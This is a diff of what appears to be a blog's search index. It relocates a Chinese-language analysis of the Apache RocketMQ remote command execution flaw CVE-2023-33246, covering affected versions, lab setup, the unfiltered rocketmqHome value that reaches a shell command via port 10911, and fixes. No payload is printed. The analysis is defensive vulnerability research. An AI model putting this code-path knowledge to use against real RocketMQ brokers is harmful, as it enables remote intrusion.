-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">https://github.com/apache/rocketmq/releases</span><br></pre></td></tr></table></figure>
-
-<p>使用idea导入项目后配置运行时环境变量<code>ROCKETMQ_HOME</code></p>
-<p><img src="/2025/04/10/Apache-RocketMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2023-33246/image-20230720155335454.png" referrerpolicy="no-referrer" alt="image-20230720155335454"></p>
-<p><code>ROCKETMQ_HOME</code>为ROCKETMQ运行家目录，配置好环境变量后在<code>ROCKETMQ_HOME</code>指向的目录行新建文件夹<code>conf</code>，进入<code>conf</code>目录并新建文件<code>logback_broker.xml</code>，将以下内容复制到该文件中：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 配置文件修改时重新加载，默认true --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span> <span class="attr">scan</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!--定义日志文件的存储地址 勿在 LogBack 的配置中使用相对路径--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;CATALINA_BASE&quot;</span> <span class="attr">value</span>=<span class="string">&quot;**/logs&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 控制台输出 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;CONSOLE&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 输出日志记录格式 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- 第一个文件输出,每天产生一个文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;FILE1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 输出文件路径+文件名 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;CATALINA_BASE&#125;/aa.%d&#123;yyyyMMdd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 保存30天的日志 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 输出日志记录格式 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- 第二个文件输出,每天产生一个文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;FILE2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>$&#123;CATALINA_BASE&#125;/bb.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;CATALINA_BASE&#125;/bb.%d&#123;yyyyMMdd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;CUSTOM&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>$&#123;CATALINA_BASE&#125;/custom.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- daily rollover --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;CATALINA_BASE&#125;/custom.%d&#123;yyyy-MM-dd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- keep 30 days&#x27; worth of history --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 设置日志输出级别 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;ERROR&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;CONSOLE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> <span class="attr">level</span>=<span class="string">&quot;DEBUG&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;FILE1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;FILE2&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 自定义logger --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;custom&quot;</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;CUSTOM&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>环境配置完成后运行主类<code>org.apache.rocketmq.broker.BrokerStartup</code>启动ROCKETMQ Brocker，控制台输出以下内容则Brocker启动成功</p>
-<p><img src="/2025/04/10/Apache-RocketMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2023-33246/image-20230720155841681.png" referrerpolicy="no-referrer" alt="image-20230720155841681"></p>
-<p><strong>靶场搭建</strong></p>
-<p>使用vulhub靶场一键搭建</p>
-<p><code>https://github.com/vulhub/vulhub/tree/master/rocketmq/CVE-2023-33246</code></p>
-<h3 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h3><p>Broker在启动时会首先创建一个<code>BrokerController</code>然后运行它</p>
-<p><img src="/2025/04/10/Apache-RocketMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2023-33246/image-20230720164935939.png" referrerpolicy="no-referrer" alt="image-20230720164935939"></p>
-<p>BrockerController创建过程中主要进行了配置文件解析、命令行解析、网络服务配置、日志配置等操作。</p>
-<p>Controller启动时相继启动以下服务，其中在启动<code>remotingServer</code>服务时会启动<code>broker</code>监听在默认的<code>10911</code>端口</p>
-<p><img src="/2025/04/10/Apache-RocketMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2023-33246/image-20230720165303285.png" referrerpolicy="no-referrer" alt="image-20230720165303285"></p>
-<p>在进行<code>filterServerManager</code>启动过程中会以30S的频率轮询创建<code>filterServer</code></p>
-<p><img src="/2025/04/10/Apache-RocketMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2023-33246/image-20230720165452954.png" referrerpolicy="no-referrer" alt="image-20230720165452954"></p>
-<p>创建<code>filterServer</code>时调用方法<code>org.apache.rocketmq.broker.filtersrv.FilterServerManager#buildStartCommand</code>解析数据拼接参数</p>
-<p><img src="/2025/04/10/Apache-RocketMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2023-33246/image-20230720165739570.png" referrerpolicy="no-referrer" alt="image-20230720165739570"></p>
-<p>在进行参数拼接过程中会从<code>brokerConfig</code>中获取<code>rocketmqHome</code>与<code>namesrvAddr</code>两个值。</p>
-<p>我们可以通过模拟RocketMQ协议向10911端口发送特制的数据包来影响<code>rocketmqHome</code>的值为可控的值，又因应用在进行命令拼接过程中未对用户的输入值进行有效的过滤，从而导致任意命令执行，此时我们使用网络上公开的PoC向10911端口发送数据然后调试</p>
-<p><img src="/2025/04/10/Apache-RocketMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2023-33246/image-20230720170706116.png" referrerpolicy="no-referrer" alt="image-20230720170706116"></p>
-<p><img src="/2025/04/10/Apache-RocketMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2023-33246/image-20230720170558173.png" referrerpolicy="no-referrer" alt="image-20230720170558173"></p>
-<p>可以看到，此时获取的<code>rocketmqHome</code>值已经变更为我们输入的Payload</p>
-<p>在<code>buildStartCommand</code>方法调用完毕后，会返回拼接的字符串然后调用<code>org.apache.rocketmq.broker.filtersrv.FilterServerUtil#callShell</code>方法进行命令执行</p>
-<p>整个流程的调用栈为</p>
-<p><img src="/2025/04/10/Apache-RocketMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2023-33246/image-20230720171016289.png" referrerpolicy="no-referrer" alt="image-20230720171016289"></p>
-<h2 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h2><p>1、非必须勿向互联网开放不必要的服务端口，控制暴露面；</p>
-<p>2、关键服务增加用户权限校验；</p>
-<p>3、升级软件到不受影响的版本或最新版。</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
-<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33246">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33246</a></li>
-<li><a href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2023-33246">https://www.cvedetails.com/cve-details.php?t=1&amp;cve_id=CVE-2023-33246</a></li>
-<li><a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202305-2101">http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202305-2101</a></li>
-</ul>
-<h2 id="软安解决方案"><a href="#软安解决方案" class="headerlink" title="软安解决方案"></a>软安解决方案</h2>]]></content>
-      <categories>
-        <category>安全技术</category>
-        <category>漏洞分析</category>
-      </categories>
-      <tags>
-        <tag>Apache RocketMQ</tag>
-        <tag>CVE-2023-33246</tag>
-        <tag>RCE</tag>
-        <tag>远程代码执行</tag>
-        <tag>反序列化</tag>
-        <tag>网络安全</tag>
-        <tag>漏洞分析</tag>
-        <tag>漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Apache RocketMQ 远程代码执行（CVE-2023-37582）</title>
     <url>/2025/04/10/Apache-RocketMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2023-37582/</url>
     <content><![CDATA[<h1 id="CVE-2023-37582"><a href="#CVE-2023-37582" class="headerlink" title="CVE-2023-37582"></a>CVE-2023-37582</h1><h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p>RocketMQ是阿里巴巴在2012年开发的分布式消息中间件，后捐献给Apache软件基金会并成为Apache的顶级项目。RocketMQ专为万亿级超大规模的消息处理而设计，具有高吞吐量、低延迟、海量堆积、顺序收发等特点。</p>
@@ -4430,13 +4381,77 @@
       </categories>
       <tags>
         <tag>Apache RocketMQ</tag>
+        <tag>CVE-2023-37582</tag>
         <tag>RCE</tag>
         <tag>远程代码执行</tag>
         <tag>反序列化</tag>
         <tag>网络安全</tag>
         <tag>漏洞分析</tag>
         <tag>漏洞</tag>
-        <tag>CVE-2023-37582</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Apache RocketMQ 远程代码执行（CVE-2023-33246）</title>
+    <url>/2025/04/10/Apache-RocketMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2023-33246/</url>
+    <content><![CDATA[<h1 id="CVE-2023-33246"><a href="#CVE-2023-33246" class="headerlink" title="CVE-2023-33246"></a>CVE-2023-33246</h1><h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p>RocketMQ是阿里巴巴在2012年开发的分布式消息中间件，后捐献给Apache软件基金会并成为Apache的顶级项目。RocketMQ专为万亿级超大规模的消息处理而设计，具有高吞吐量、低延迟、海量堆积、顺序收发等特点。</p>
+<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>RocketMQ 5.1.0及以下版本，在一定条件下，存在远程命令执行风险。漏洞源于RocketMQ的NameServer、Broker、Controller等多个组件暴露在公网中且缺乏权限校验。攻击者可以利用该漏洞利用更新配置功能以RocketMQ运行的系统用户身份执行任意操作系统命令。</p>
+<span id="more"></span>
+
+<h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><p>5.0.0 &lt;&#x3D; Apache RocketMQ &lt; 5.1.1</p>
+<p>4.0.0 &lt;&#x3D; Apache RocketMQ &lt; 4.9.6</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="测试环境搭建"><a href="#测试环境搭建" class="headerlink" title="测试环境搭建"></a>测试环境搭建</h3><p><strong>调试环境</strong></p>
+<p>访问项目官方仓库获取受影响漏洞版本源码</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">https://github.com/apache/rocketmq/releases</span><br></pre></td></tr></table></figure>
+
+<p>使用idea导入项目后配置运行时环境变量<code>ROCKETMQ_HOME</code></p>
+<p><img src="/2025/04/10/Apache-RocketMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2023-33246/image-20230720155335454.png" referrerpolicy="no-referrer" alt="image-20230720155335454"></p>
+<p><code>ROCKETMQ_HOME</code>为ROCKETMQ运行家目录，配置好环境变量后在<code>ROCKETMQ_HOME</code>指向的目录行新建文件夹<code>conf</code>，进入<code>conf</code>目录并新建文件<code>logback_broker.xml</code>，将以下内容复制到该文件中：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 配置文件修改时重新加载，默认true --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span> <span class="attr">scan</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!--定义日志文件的存储地址 勿在 LogBack 的配置中使用相对路径--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;CATALINA_BASE&quot;</span> <span class="attr">value</span>=<span class="string">&quot;**/logs&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 控制台输出 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;CONSOLE&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 输出日志记录格式 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- 第一个文件输出,每天产生一个文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;FILE1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 输出文件路径+文件名 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;CATALINA_BASE&#125;/aa.%d&#123;yyyyMMdd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 保存30天的日志 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 输出日志记录格式 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- 第二个文件输出,每天产生一个文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;FILE2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>$&#123;CATALINA_BASE&#125;/bb.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;CATALINA_BASE&#125;/bb.%d&#123;yyyyMMdd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;CUSTOM&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>$&#123;CATALINA_BASE&#125;/custom.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- daily rollover --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;CATALINA_BASE&#125;/custom.%d&#123;yyyy-MM-dd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- keep 30 days&#x27; worth of history --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 设置日志输出级别 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;ERROR&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;CONSOLE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> <span class="attr">level</span>=<span class="string">&quot;DEBUG&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;FILE1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;FILE2&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 自定义logger --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;custom&quot;</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;CUSTOM&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>环境配置完成后运行主类<code>org.apache.rocketmq.broker.BrokerStartup</code>启动ROCKETMQ Brocker，控制台输出以下内容则Brocker启动成功</p>
+<p><img src="/2025/04/10/Apache-RocketMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2023-33246/image-20230720155841681.png" referrerpolicy="no-referrer" alt="image-20230720155841681"></p>
+<p><strong>靶场搭建</strong></p>
+<p>使用vulhub靶场一键搭建</p>
+<p><code>https://github.com/vulhub/vulhub/tree/master/rocketmq/CVE-2023-33246</code></p>
+<h3 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h3><p>Broker在启动时会首先创建一个<code>BrokerController</code>然后运行它</p>
+<p><img src="/2025/04/10/Apache-RocketMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2023-33246/image-20230720164935939.png" referrerpolicy="no-referrer" alt="image-20230720164935939"></p>
+<p>BrockerController创建过程中主要进行了配置文件解析、命令行解析、网络服务配置、日志配置等操作。</p>
+<p>Controller启动时相继启动以下服务，其中在启动<code>remotingServer</code>服务时会启动<code>broker</code>监听在默认的<code>10911</code>端口</p>
